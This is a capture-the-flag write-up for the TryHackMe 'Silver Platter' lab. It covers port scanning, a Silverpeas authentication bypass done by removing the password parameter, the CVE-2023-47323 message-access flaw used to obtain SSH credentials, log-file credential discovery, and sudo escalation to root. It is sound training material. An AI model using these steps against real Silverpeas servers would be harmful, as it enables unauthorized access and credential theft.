# THM - Silver Platter

### Ip: 10.129.21.176
### Name: Silver Platter
### Rating: Easy

------------------------------------------------

![thm_silver_platter_pic.png](../assets/silver_platter_assets/thm_silver_platter_pic.png)

### Intro:

```
Welcome to Silver Platter

Think you've got what it takes to outsmart the Hack Smarter Security team? They claim to be unbeatable, and now it's your chance to prove them wrong. Dive into their web server, find the hidden flags, and show the world your elite hacking skills. Good luck, and may the best hacker win!

But beware, this won't be a walk in the digital park. Hack Smarter Security has fortified the server against common attacks and their password policy requires passwords that have not been breached (they check it against the rockyou.txt wordlist - that's how 'cool' they are). The hacking gauntlet has been thrown, and it's time to elevate your game. Remember, only the most ingenious will rise to the top. 

May your code be swift, your exploits flawless, and victory yours!
```

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up. I'll also use the `-sC` and `-sV` to use basic Nmap scripts and to enumerate versions:

```
┌──(ryan㉿kali)-[~/THM/Silver_Platter]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.10.234.44
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-13 10:53 CST
Nmap scan report for 10.10.234.44
Host is up (0.15s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 1b1c878afe3416c9f782372b108f8bf1 (ECDSA)
|_  256 266d17ed839e4f2df6cd5317c8803d09 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
|_http-server-header: nginx/1.18.0 (Ubuntu)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Mon, 13 Jan 2025 16:53:48 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Mon, 13 Jan 2025 16:53:47 GMT
|_    <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|_http-title: Error
```

Looking at the page on port 80 we find a simple site for a security company:

thm_silver_platter_site.png

Clicking on the Contact button we find:

thm_silver_platter_contact.png

We can access the SilvePeas login at http://10.10.234.44:8080/silverpeas

thm_silver_platter_login.png

### Exploitation

Looking for Silverpeas exploits I find some info about a login bypass at: https://gist.github.com/ChrisPritchard/4b6d5c70d9329ef116266a6c238dcb2d

We can replicate this by capturing a login request in burp and removing the password field as demonstrated in the writeup:

```
Login=SilverAdmin&DomainId=0
```

thm_silver_platter_burp.png

Forwarding the request we find ourselves authenticated:

thm_silver_platter_in.png

Looking for more silverpeas exploits I find:

https://github.com/RhinoSecurityLabs/CVEs/tree/master/CVE-2023-47323

Which outlines a broken access control vulnerability that allows us to view all messages.

Browsing the messages using the ID parameter we find:

thm_silver_platter_creds.png

Nice, looks like we've got some SSH credentials here: `tom:cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol`

We can use these to SSH onto the box and grab the user.txt flag:

thm_silver_platter_user.png

### Privilege Escalation

Running the `id` command we see that user tim is in the `adm` group, which means we will likely have read access to several files in `/var/log`.

```
tim@silver-platter:~$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```

In `/var/log` we find a few interesting log files and discover a credential in auth.log.2 and can use this to `su tyler`:

thm_silver_platter_log.png

```
tim@silver-platter:/var/log$ su tyler
Password: 
tyler@silver-platter:/var/log$
```

Now that we are user tyler we can run `sudo -l` and find:

```
tyler@silver-platter:/var/log$ sudo -l
[sudo] password for tyler: 
Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL
```

We can now run:

```
tyler@silver-platter:/var/log$ sudo su -
root@silver-platter:~# whoami
root
```

And grab the final flag:

thm_silver_platter_root.png

Thanks for following along!

-Ryan

----------------------------------------------
